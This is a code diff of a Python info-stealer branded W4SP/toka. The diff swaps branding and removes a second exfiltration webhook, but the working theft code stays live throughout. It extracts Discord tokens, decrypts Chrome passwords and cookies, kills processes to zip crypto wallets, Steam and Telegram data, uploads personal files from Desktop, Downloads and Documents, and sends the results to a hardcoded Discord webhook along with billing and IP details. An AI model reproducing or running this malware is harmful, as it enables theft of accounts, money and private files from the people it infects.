@@ -1,4 +1,3 @@
-import contextlib
 import os
 import threading
 from sys import executable
@@ -16,21 +15,21 @@ import random
 import re
 import subprocess
 
-#    THIS IS 1.1.6 VERSION DHOOK BY ASPELL
-#   BY W4SP, loTus04 (and Aspell for DHOOK)
-#          Edited with love ❤
+#  THIS IS 1.1.6 VERSION
+#    BY W4SP, loTus04
+# 
 
 
 hook = "https://discord.com/api/webhooks/1121804316051767366/yBOLU644GbSXKYwz6L1V0ek49JKLo6NkyV9dYBVBZni24t8aLfF_kZGabJNe4XXF-m8c"
-dhook ="https://discord.com/api/webhooks/1121804367432007721/odJXU-3KWS4n25BTWUUrGQbGUamvSu1KUTYNYVdp3YEAU62UEe492hhvLP47n5d13V5w"
-
 DETECTED = False
 
 
 def getip():
     ip = "None"
-    with contextlib.suppress(Exception):
+    try:
         ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except:
+        pass
     return ip
 
 requirements = [
@@ -78,7 +77,7 @@ def CryptUnprotectData(encrypted_bytes, entropy=b''):
 
 def DecryptValue(buff, master_key=None):
     starts = buff.decode(encoding='utf8', errors='ignore')[:3]
-    if starts in ['v10', 'v11']:
+    if starts == 'v10' or starts == 'v11':
         iv = buff[3:15]
         payload = buff[15:]
         cipher = AES.new(master_key, AES.MODE_GCM, iv)
@@ -87,8 +86,8 @@ def DecryptValue(buff, master_key=None):
         return decrypted_pass
 
 def LoadRequests(methode, url, data='', files='', headers=''):
-    for _ in range(8):
-        with contextlib.suppress(Exception):
+    for i in range(8): # max trys
+        try:
             if methode == 'POST':
                 if data != '':
                     r = requests.post(url, data=data)
@@ -96,26 +95,22 @@ def LoadRequests(methode, url, data='', files='', headers=''):
                         return r
                 elif files != '':
                     r = requests.post(url, files=files)
-                    if r.status_code in {200, 413}: # 413 = DATA TO BIG
+                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
                         return r
+        except:
+            pass
 
 def LoadUrlib(hook, data='', files='', headers=''):
-    for _ in range(8):
-        with contextlib.suppress(Exception):
-            return (
-                urlopen(Request(hook, data=data, headers=headers))
-                if headers != ''
-                else urlopen(Request(hook, data=data))
-            )
-        
-def dhook(dhook, data='', files='', headers=''):
-    for _ in range(8):
-        with contextlib.suppress(Exception):
-            return (
-                urlopen(Request(dhook, data=data, headers=headers))
-                if headers != ''
-                else urlopen(Request(dhook, data=data))
-            )
+    for i in range(8):
+        try:
+            if headers != '':
+                r = urlopen(Request(hook, data=data, headers=headers))
+                return r
+            else:
+                r = urlopen(Request(hook, data=data))
+                return r
+        except: 
+            pass
 
 def globalInfo():
     ip = getip()
@@ -126,7 +121,9 @@ def globalInfo():
     # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
     contry = ipdata["country_name"]
     contryCode = ipdata["country_code"].lower()
-    return f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
+    globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
+    # print(globalinfo)
+    return globalinfo
 
 
 def Trust(Cookies):
@@ -135,8 +132,12 @@ def Trust(Cookies):
     data = str(Cookies)
     tim = re.findall(".google.com", data)
     # print(len(tim))
-    DETECTED = len(tim) < -1
-    return DETECTED
+    if len(tim) < -1:
+        DETECTED = True
+        return DETECTED
+    else:
+        DETECTED = False
+        return DETECTED
         
 def GetUHQFriends(token):
     badgeList =  [
@@ -158,7 +159,7 @@ def GetUHQFriends(token):
     }
     try:
         friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
-    except Exception:
+    except:
         return False
 
     uhqlist = ''
@@ -167,7 +168,7 @@ def GetUHQFriends(token):
         flags = friend['user']['public_flags']
         for badge in badgeList:
             if flags // badge["Value"] != 0 and friend['type'] == 1:
-                if "House" not in badge["Name"]:
+                if not "House" in badge["Name"]:
                     OwnedBadges += badge["Emoji"]
                 flags = flags % badge["Value"]
         if OwnedBadges != '':
@@ -183,9 +184,9 @@ def GetBilling(token):
     }
     try:
         billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
-    except Exception:
+    except:
         return False
-
+    
     if billingjson == []: return " -"
 
     billing = ""
@@ -237,13 +238,16 @@ def GetTokenInfo(token):
     pfp = userjson["avatar"]
     flags = userjson["public_flags"]
     nitro = ""
+    phone = "-"
+
     if "premium_type" in userjson: 
         nitrot = userjson["premium_type"]
         if nitrot == 1:
             nitro = "<:classic:896119171019067423> "
         elif nitrot == 2:
             nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
-    phone = f'`{userjson["phone"]}`' if "phone" in userjson else "-"
+    if "phone" in userjson: phone = f'`{userjson["phone"]}`'
+
     return username, hashtag, email, idd, pfp, flags, nitro, phone
 
 def checkToken(token):
@@ -255,20 +259,19 @@ def checkToken(token):
     try:
         urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
         return True
-    except Exception:
+    except:
         return False
 
 
 def uploadToken(token, path):
     global hook
-    global dhook
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
     username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
 
-    if pfp is None: 
+    if pfp == None: 
         pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
@@ -327,7 +330,7 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "@tokaSTEALER",
+                "text": "@W4SP STEALER",
                 "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
                 },
             "thumbnail": {
@@ -336,12 +339,12 @@ def uploadToken(token, path):
             }
         ],
         "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
-        "username": "tokaStealer",
+        "username": "W4SP Stealer",
         "attachments": []
         }
     # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
-    dhook(dhook, data=dumps(data).encode(), headers=headers)
+
 def Reformat(listt):
     e = re.findall("(\w+[a-z])",listt)
     while "https" in e: e.remove("https")
@@ -356,19 +359,19 @@ def upload(name, link):
     }
 
     if name == "wpcook":
-        rb = ' | '.join(cookiWords)
+        rb = ' | '.join(da for da in cookiWords)
         if len(rb) > 1000: 
             rrrrr = Reformat(str(cookiWords))
-            rb = ' | '.join(rrrrr)
+            rb = ' | '.join(da for da in rrrrr)
         data = {
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "toka| Cookies Stealer",
+                    "title": "W4SP | Cookies Stealer",
                     "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [w4spCookies.txt]({link})",
                     "color": 14406413,
                     "footer": {
-                        "text": "@tokaSTEALER",
+                        "text": "@W4SP STEALER",
                         "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
                     }
                 }
@@ -378,24 +381,23 @@ def upload(name, link):
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
-        dhook(dhook, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "wppassw":
-        ra = ' | '.join(paswWords)
+        ra = ' | '.join(da for da in paswWords)
         if len(ra) > 1000: 
             rrr = Reformat(str(paswWords))
-            ra = ' | '.join(rrr)
+            ra = ' | '.join(da for da in rrr)
 
         data = {
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "toka| Password Stealer",
+                    "title": "W4SP | Password Stealer",
                     "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [w4spPassword.txt]({link})",
                     "color": 14406413,
                     "footer": {
-                        "text": "@tokaSTEALER",
+                        "text": "@W4SP STEALER",
                         "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
                     }
                 }
@@ -405,7 +407,6 @@ def upload(name, link):
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
-        dhook(dhook, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "kiwi":
@@ -421,10 +422,10 @@ def upload(name, link):
                     }
                 ],
                 "author": {
-                    "name": "toka| File Stealer"
+                    "name": "W4SP | File Stealer"
                 },
                 "footer": {
-                    "text": "@tokaSTEALER",
+                    "text": "@W4SP STEALER",
                     "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
                 }
                 }
@@ -434,7 +435,6 @@ def upload(name, link):
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
-        dhook(dhook, data=dumps(data).encode(), headers=headers)
         return
 
 
@@ -451,7 +451,7 @@ def upload(name, link):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--tokaSTEALER ON TOP-->\n\n")
+        f.write(f"<--W4SP STEALER ON TOP-->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -462,15 +462,16 @@ def getToken(path, arg):
 
     path += arg
     for file in os.listdir(path):
-        if file.endswith(".log") or file.endswith(".ldb"):
+        if file.endswith(".log") or file.endswith(".ldb")   :
             for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                 for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                     for token in re.findall(regex, line):
                         global Tokens
-                        if checkToken(token) and token not in Tokens:
-                            # print(token)
-                            Tokens += token
-                            uploadToken(token, path)
+                        if checkToken(token):
+                            if not token in Tokens:
+                                # print(token)
+                                Tokens += token
+                                uploadToken(token, path)
 
 Passw = []
 def getPassw(path, arg):
@@ -480,11 +481,7 @@ def getPassw(path, arg):
     pathC = path + arg + "/Login Data"
     if os.stat(pathC).st_size == 0: return
 
-    tempfold = (
-        f"{temp}wp"
-        + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
-        + ".db"
-    )
+    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
@@ -495,7 +492,7 @@ def getPassw(path, arg):
     conn.close()
     os.remove(tempfold)
 
-    pathKey = f"{path}/Local State"
+    pathKey = path + "/Local State"
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
     master_key = CryptUnprotectData(master_key[5:])
@@ -507,8 +504,8 @@ def getPassw(path, arg):
                 if "https" in wa:
                     tmp = wa
                     wa = tmp.split('[')[1].split(']')[0]
-                if wa in row[0] and old not in paswWords:
-                    paswWords.append(old)
+                if wa in row[0]:
+                    if not old in paswWords: paswWords.append(old)
             Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
             PasswCount += 1
     writeforfile(Passw, 'passw')
@@ -517,16 +514,12 @@ Cookies = []
 def getCookie(path, arg):
     global Cookies, CookiCount
     if not os.path.exists(path): return
-
+    
     pathC = path + arg + "/Cookies"
     if os.stat(pathC).st_size == 0: return
-
-    tempfold = (
-        f"{temp}wp"
-        + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
-        + ".db"
-    )
-
+    
+    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
     cursor = conn.cursor()
@@ -536,8 +529,8 @@ def getCookie(path, arg):
     conn.close()
     os.remove(tempfold)
 
-    pathKey = f"{path}/Local State"
-
+    pathKey = path + "/Local State"
+    
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
     master_key = CryptUnprotectData(master_key[5:])
@@ -549,8 +542,8 @@ def getCookie(path, arg):
                 if "https" in wa:
                     tmp = wa
                     wa = tmp.split('[')[1].split(']')[0]
-                if wa in row[0] and old not in cookiWords:
-                    cookiWords.append(old)
+                if wa in row[0]:
+                    if not old in cookiWords: cookiWords.append(old)
             Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}")
             CookiCount += 1
     writeforfile(Cookies, 'cook')
@@ -560,24 +553,25 @@ def GetDiscord(path, arg):
 
     pathC = path + arg
 
-    pathKey = f"{path}/Local State"
+    pathKey = path + "/Local State"
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
     master_key = CryptUnprotectData(master_key[5:])
     # print(path, master_key)
-
+    
     for file in os.listdir(pathC):
         # print(path, file)
-        if file.endswith(".log") or file.endswith(".ldb"):
+        if file.endswith(".log") or file.endswith(".ldb")   :
             for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                 for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                     global Tokens
                     tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
-                    if checkToken(tokenDecoded) and tokenDecoded not in Tokens:
-                        # print(token)
-                        Tokens += tokenDecoded
-                        # writeforfile(Tokens, 'tokens')
-                        uploadToken(tokenDecoded, path)
+                    if checkToken(tokenDecoded):
+                        if not tokenDecoded in Tokens:
+                            # print(token)
+                            Tokens += tokenDecoded
+                            # writeforfile(Tokens, 'tokens')
+                            uploadToken(tokenDecoded, path)
 
 def GatherZips(paths1, paths2, paths3):
     thttht = []
@@ -590,7 +584,7 @@ def GatherZips(paths1, paths2, paths3):
         a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
         a.start()
         thttht.append(a)
-
+    
     a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
     a.start()
     thttht.append(a)
@@ -598,19 +592,21 @@ def GatherZips(paths1, paths2, paths3):
     for thread in thttht: 
         thread.join()
     global WalletsZip, GamingZip, OtherZip
+        # print(WalletsZip, GamingZip, OtherZip)
+
     wal, ga, ot = "",'',''
-    if len(WalletsZip) != 0:
+    if not len(WalletsZip) == 0:
         wal = ":coin:  •  Wallets\n"
         for i in WalletsZip:
             wal += f"└─ [{i[0]}]({i[1]})\n"
-    if len(GamingZip) != 0:
+    if not len(GamingZip) == 0:
         ga = ":video_game:  •  Gaming:\n"
         for i in GamingZip:
             ga += f"└─ [{i[0]}]({i[1]})\n"
-    if len(OtherZip) != 0:
+    if not len(OtherZip) == 0:
         ot = ":tickets:  •  Apps\n"
         for i in OtherZip:
-            ot += f"└─ [{i[0]}]({i[1]})\n"
+            ot += f"└─ [{i[0]}]({i[1]})\n"          
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -620,38 +616,33 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "tokaZips",
+            "title": "W4SP Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 15781403,
             "footer": {
-                "text": "@tokaSTEALER",
+                "text": "@W4SP STEALER",
                 "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
             }
             }
         ],
-        "username": "tokaStealer",
+        "username": "W4SP Stealer",
         "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
         "attachments": []
     }
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
-    dhook(dhook, data=dumps(data).encode(), headers=headers)
+
 
 def ZipTelegram(path, arg, procc):
     global OtherZip
     pathC = path
     name = arg
-    if not os.pathC.exists(pathC): return
+    if not os.path.exists(pathC): return
     subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
 
     zf = ZipFile(f"{pathC}/{name}.zip", "w")
     for file in os.listdir(pathC):
-        if (
-            ".zip" not in file
-            and "tdummy" not in file
-            and "user_data" not in file
-            and "webview" not in file
-        ): 
-            zf.write(f"{pathC}/{file}")
+        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
+            zf.write(pathC + "/" + file)
     zf.close()
 
     lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
@@ -670,7 +661,7 @@ def ZipThings(path, arg, procc):
         browser = path.split("\\")[4].split("/")[1].replace(' ', '')
         name = f"Metamask_{browser}"
         pathC = path + arg
-
+    
     if not os.path.exists(pathC): return
     subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
 
@@ -682,15 +673,18 @@ def ZipThings(path, arg, procc):
         if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
         f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
         data = f.readlines()
-        found = any('RememberPassword"\t\t"1"' in l for l in data)
-        if not found: return
+        # print(data)
+        found = False
+        for l in data:
+            if 'RememberPassword"\t\t"1"' in l:
+                found = True
+        if found == False: return
         name = arg
 
 
     zf = ZipFile(f"{pathC}/{name}.zip", "w")
     for file in os.listdir(pathC):
-        if ".zip" not in file:
-            zf.write(f"{pathC}/{file}")
+        if not ".zip" in file: zf.write(pathC + "/" + file)
     zf.close()
 
     lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
@@ -798,13 +792,14 @@ def KiwiFolder(pathF, keywords):
     listOfFile = os.listdir(pathF)
     ffound = []
     for file in listOfFile:
-        if not os.path.isfile(f"{pathF}/{file}"): return
+        if not os.path.isfile(pathF + "/" + file): return
         i += 1
-        if i > maxfilesperdir:
+        if i <= maxfilesperdir:
+            url = uploadToAnonfiles(pathF + "/" + file)
+            ffound.append([pathF + "/" + file, url])
+        else:
             break
-        url = uploadToAnonfiles(f"{pathF}/{file}")
-        ffound.append([f"{pathF}/{file}", url])
-    KiwiFiles.append(["folder", f"{pathF}/", ffound])
+    KiwiFiles.append(["folder", pathF + "/", ffound])
 
 KiwiFiles = []
 def KiwiFile(path, keywords):
@@ -814,11 +809,11 @@ def KiwiFile(path, keywords):
     for file in listOfFile:
         for worf in keywords:
             if worf in file.lower():
-                if os.path.isfile(f"{path}/{file}") and ".txt" in file:
-                    fifound.append([f"{path}/{file}", uploadToAnonfiles(f"{path}/{file}")])
+                if os.path.isfile(path + "/" + file) and ".txt" in file:
+                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                     break
-                if os.path.isdir(f"{path}/{file}"):
-                    target = f"{path}/{file}"
+                if os.path.isdir(path + "/" + file):
+                    target = path + "/" + file
                     KiwiFolder(target, keywords)
                     break
 
@@ -826,7 +821,11 @@ def KiwiFile(path, keywords):
 
 def Kiwi():
     user = temp.split("\AppData")[0]
-    path2search = [f"{user}/Desktop", f"{user}/Downloads", f"{user}/Documents"]
+    path2search = [
+        user + "/Desktop",
+        user + "/Downloads",
+        user + "/Documents"
+    ]
 
     key_wordsFolder = [
         "account",
